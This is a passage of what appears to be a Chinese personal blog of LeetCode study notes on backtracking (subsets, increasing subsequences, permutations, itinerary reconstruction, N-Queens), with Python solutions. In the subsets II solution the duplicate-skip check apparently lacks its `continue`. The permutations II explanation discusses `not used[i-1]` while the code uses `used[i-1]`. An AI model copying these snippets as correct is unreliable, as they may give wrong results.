class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">255</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> i<span class="token operator">==</span>index <span class="token punctuation">)</span> <span class="token punctuation">:</span>                    backTrack<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>dots<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>curIP<span class="token operator">+</span>s<span class="token punctuation">[</span>index<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.'</span><span class="token punctuation">)</span>        backTrack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子集问题"><a class="markdownIt-Anchor" href="#子集问题"></a> 子集问题</h2><h3 id="78-子集"><a class="markdownIt-Anchor" href="#78-子集"></a> <a href="https://leetcode.cn/problems/subsets/">78. 子集</a></h3><p>给你一个整数数组 <code>nums</code> ，数组中的元素 <strong>互不相同</strong> 。返回该数组所有可能的子集（幂集）。</p><p>解集 <strong>不能</strong> 包含重复的子集。你可以按 <strong>任意顺序</strong> 返回解集</p><h4 id="思路-8"><a class="markdownIt-Anchor" href="#思路-8"></a> 思路</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">subsets</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="90-子集-ii"><a class="markdownIt-Anchor" href="#90-子集-ii"></a> <a href="https://leetcode.cn/problems/subsets-ii/">90. 子集 II</a></h3><p>给你一个整数数组 <code>nums</code> ，其中可能包含重复元素，请你返回该数组所有可能的子集</p><p>解集 <strong>不能</strong> 包含重复的子集。返回的解集中，子集可以按 <strong>任意顺序</strong> 排列。</p><h4 id="思路-9"><a class="markdownIt-Anchor" href="#思路-9"></a> 思路</h4><p>这道题目和<a href="https://programmercarl.com/0078.%E5%AD%90%E9%9B%86.html">78.子集 </a>区别就是集合里有重复元素了，而且求取的子集要去重。</p><p>**去重的关键:**一树层上重复取2 就要过滤掉，同一树枝上就可以重复取2，因为同一树枝上元素的集合才是唯一子集！</p><p>（<strong>注意去重需要先对集合排序</strong>）去重的思路与<a href="https://programmercarl.com/0040.%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8CII.html">回溯算法：求组合总和（三）</a>大体相同</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">subsetsWithDup</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> i <span class="token operator">></span> index<span class="token punctuation">:</span> <span class="token comment">#树层去重</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="491递增子序列"><a class="markdownIt-Anchor" href="#491递增子序列"></a> 491.递增子序列</h3><p>给你一个整数数组 <code>nums</code> ，找出并返回所有该数组中不同的递增子序列，递增子序列中 <strong>至少有两个元素</strong> 。你可以按 <strong>任意顺序</strong> 返回答案。</p><p>数组中可能含有重复元素，如出现两个整数相等，也可以视作递增序列的一种特殊情况。</p><h4 id="思路-10"><a class="markdownIt-Anchor" href="#思路-10"></a> 思路</h4><p>一个递增子序列 path 怎么产生？它的元素是从 nums 中一个个选的。<br />比如 [4,2,7,7]，path 选第一个数，有 4 种选择：从nums[0]到nums[3]。<br />选了nums[i]之后，会在nums[i+1]到末尾的数中，再选下一个……<br />以此类推，直到没得选为止。当 path 满足要求，就可以加入解集，这是递归回溯的思路。</p><p>定义递归函数：在从下标 start 到末尾的子数组中选合适的数推入 path。path 也作为参数。在递归过程中，不断选数字入 path。</p><p>递归函数中，通过 for 循环枚举出当前的所有选择——（展开不同的递归分支）。</p><p>选择了一个数，推入 path，往下继续选择（继续递归）。</p><p>当 start 指针到达边界，能选的都选了，没有数字可选了，结束递归。</p><p>基于当前选择的递归，已经考察了所有可能，这时会回溯，path 要撤销最末尾的数字，切入别的分支。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findSubsequences</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#由于返回的是该数组中不同的递增子序列，并且递增子序列中至少有两个元素，需要进行树层去重</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token comment">#这里不要取return，要取树上的节点</span>            uset<span class="token operator">=</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> path <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>path<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> uset<span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                uset<span class="token punctuation">.</span>add<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#记录这个元素在本层中已经用过了</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="排列问题"><a class="markdownIt-Anchor" href="#排列问题"></a> 排列问题</h2><h3 id="46-全排列"><a class="markdownIt-Anchor" href="#46-全排列"></a> <a href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h3><p>给定一个不含重复数字的数组 <code>nums</code> ，返回其 <em>所有可能的全排列</em> 。你可以 <strong>按任意顺序</strong> 返回答案。</p><h4 id="思路-11"><a class="markdownIt-Anchor" href="#思路-11"></a> 思路</h4><p>抽象为树，每次都是从0开始遍历</p><p>这题的主要考点就是进行树枝去重</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">permute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        used<span class="token operator">=</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#进行树枝去重</span>                    <span class="token keyword">continue</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                  dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="47-全排列-ii"><a class="markdownIt-Anchor" href="#47-全排列-ii"></a> <a href="https://leetcode.cn/problems/permutations-ii/">47. 全排列 II</a></h3><p>给定一个可包含重复数字的序列 <code>nums</code> ，<em><strong>按任意顺序</strong></em> 返回所有不重复的全排列。</p><h4 id="思路-12"><a class="markdownIt-Anchor" href="#思路-12"></a> 思路</h4><p>与上题类似，把树枝去重改成树层去重即可</p><p>树层去重有两种方法：1.采用used数组记录状态2.先排序，利用双指针进行去重</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">permuteUnique</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        used<span class="token operator">=</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> used<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">or</span> used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#进行树层去重,还要进行树枝去重</span>                    <span class="token keyword">continue</span>                used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码去重的关键在与</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> used<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">or</span> used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token triple-quoted-string string">'''进行详细解释:nums[i]==nums[i-1] 代表着树层去重or used[i] 是进行树枝去重而and used[i-1] 或者说可以写出 and not used[i+1]条件 not used[i-1] 的目的是确保算法在处理输入数组 nums 中的重复元素时不会跳过考虑某个递归树的特定分支。让我们在代码上下文中详细解释这个条件的目的：在同一层次的重复检查（树的分支）：条件 (i > 0 and nums[i]==nums[i-1] and not used[i-1]) 检查在同一层次（在递归树的同一分支中）是否存在重复元素。如果 nums[i] 与 nums[i-1] 相同（重复元素），且 used[i-1] 为 False（表示在当前分支中前一个元素未被使用），则跳过该分支以避免生成重复的排列。示例：考虑输入数组 nums = [1, 1, 2]。如果没有条件 not used[i-1]，算法可能会生成重复的排列，比如 [1, 1, 2]，因为第一个 1 可以选择在位置 0 或 1。该条件通过确保仅在第一次出现的 1 已被使用时考虑第二次出现的 1，从而防止了这种情况。总体重复避免策略：整个条件 (i > 0 and nums[i]==nums[i-1] and not used[i-1]) 是处理在递归树的同一层次（同一分支）和不同层次（不同分支）上的重复元素的策略的一部分。used 数组跟踪在特定层次使用的元素，该条件有助于跳过某些分支，以避免生成重复的排列。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="332-重新安排行程"><a class="markdownIt-Anchor" href="#332-重新安排行程"></a> <a href="https://leetcode.cn/problems/reconstruct-itinerary/">332. 重新安排行程</a></h3><p>给你一份航线列表 <code>tickets</code> ，其中 <code>tickets[i] = [fromi, toi]</code> 表示飞机出发和降落的机场地点。请你对该行程进行重新规划排序。</p><p>所有这些机票都属于一个从 <code>JFK</code>（肯尼迪国际机场）出发的先生，所以该行程必须从 <code>JFK</code> 开始。如果存在多种有效的行程，请你按字典排序返回最小的行程组合。</p><ul><li>例如，行程 <code>[&quot;JFK&quot;, &quot;LGA&quot;]</code> 与 <code>[&quot;JFK&quot;, &quot;LGB&quot;]</code> 相比就更小，排序更靠前。</li></ul><p>假定所有机票至少存在一种合理的行程。且所有的机票 必须都用一次 且 只能用一次。</p><h4 id="思路-13"><a class="markdownIt-Anchor" href="#思路-13"></a> 思路</h4><pre><code>    # 核心思想--深度搜索+回溯    # 首先先把图的邻接表存进字典，然后对字典的value进行排序    # 然后从'JFK'开始深搜，每前进一层就减去一条路径，    # 直到某个节点不存通往其他节点的路径时，说明该节点就为此次行程的终点    # 需要跳出while循环进行回溯，返回到上一层节点进行搜索，再次找到倒数第二个终点，依次类推    # 设定ans为返回答案，每次找到的节点都要往头部插入    # 举例说明：[[&quot;JFK&quot;,&quot;SFO&quot;],[&quot;JFK&quot;,&quot;ATL&quot;],[&quot;SFO&quot;,&quot;ATL&quot;],[&quot;ATL&quot;,&quot;JFK&quot;],[&quot;ATL&quot;,&quot;SFO&quot;]]    # 构建领接表的字典：&#123;'JFK': ['SFO', 'ATL'], 'SFO': ['ATL'], 'ATL': ['JFK', 'SFO']&#125;)    # 按照题目要求对字典的val排序：&#123;'JFK': ['ATL', 'SFO'], 'SFO': ['ATL'], 'ATL': ['JFK', 'SFO']&#125;)    # 开始从 JFL 开始进行dfs搜索    # 1.JFK --&gt; ALT      #   JFK pop出ALT,JFK的字典变为：'JFK': ['SFO']    # 2.JFK --&gt; ALT --&gt; JFK     #   ALT pop出JFK,ALT的字典变为：'ALT': ['SFO']    # 3.JFK --&gt; ALT --&gt; JFK --&gt; SFO     #   JFK pop出SFO,JFK的字典变为：'JFK': ['']    # 4.JFK --&gt; ALT --&gt; JFK --&gt; SFO --&gt; ATL     #   SFO pop出ALT,SFO的字典变为：'SFO': ['']    # 5.JFK --&gt; ALT --&gt; JFK --&gt; SFO --&gt; ATL --&gt; SFO    #   ATL pop出SFO,ATL的字典变为：'ATL': ['']    # 此时我们可以发现SFO的val为空，没有地方可以去了，说明我们已经找出了终点SFO    # 然后向上回溯，依次将其添加到ans中    # 最终答案为：[&quot;JFK&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;SFO&quot;]</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> collections<span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findItinerary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tickets<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> collections<span class="token punctuation">.</span>defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>   <span class="token comment">#邻接表</span>        <span class="token keyword">for</span> f<span class="token punctuation">,</span> t <span class="token keyword">in</span> tickets<span class="token punctuation">:</span>            d<span class="token punctuation">[</span>f<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">[</span>t<span class="token punctuation">]</span>  <span class="token comment"># 路径存进邻接表</span>        <span class="token keyword">for</span> f <span class="token keyword">in</span> d<span class="token punctuation">:</span>            d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 邻接表排序</span>        ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 深搜函数</span>            <span class="token keyword">while</span> d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">:</span>                dfs<span class="token punctuation">(</span>d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 路径检索            </span>            ans<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span>  <span class="token comment"># 放在最前</span>        dfs<span class="token punctuation">(</span><span class="token string">'JFK'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="棋盘问题"><a class="markdownIt-Anchor" href="#棋盘问题"></a> 棋盘问题</h2><h3 id="51-n-皇后"><a class="markdownIt-Anchor" href="#51-n-皇后"></a> <a href="https://leetcode.cn/problems/n-queens/">51. N 皇后</a></h3><p>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。</p><p><strong>n 皇后问题</strong> 研究的是如何将 <code>n</code> 个皇后放置在 <code>n×n</code> 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><p>给你一个整数 <code>n</code> ，返回所有不同的 <strong>n 皇后问题</strong> 的解决方案。</p><p>每一种解法包含一个不同的 <strong>n 皇后问题</strong> 的棋子放置方案，该方案中 <code>'Q'</code> 和 <code>'.'</code> 分别代表了皇后和空位。</p><h4 id="思路-14"><a class="markdownIt-Anchor" href="#思路-14"></a> 思路</h4><p>rows相当于index，相当与树的递归深度，而cols在每一层遍历，回溯每次下的Q即可，手搓一个dfs</p><p>虽然速度只打败百分17的人，算法还需要优化，不过第一次手撕出来，还是有点高兴的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token 